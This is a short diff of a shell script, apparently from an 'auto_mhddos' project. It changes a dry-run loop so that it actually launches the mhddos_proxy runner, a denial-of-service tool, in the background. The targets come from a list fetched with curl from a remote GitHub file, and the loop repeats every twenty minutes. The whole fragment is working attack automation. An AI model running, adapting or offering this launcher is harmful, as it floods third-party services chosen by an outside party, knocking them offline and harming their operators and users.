@@ -24,7 +24,7 @@ do
       do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
             echo -e $i": " $cmd_line $threads "--rpc 100" "-p 3600" "--debug\n"
-            #python3 ~/mhddos_proxy/runner.py $cmd_line $threads "--rpc 100" "-p 3600" "--debug"&
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads "--rpc 100" "-p 3600" "--debug"&
       done
 sleep 20m
 done
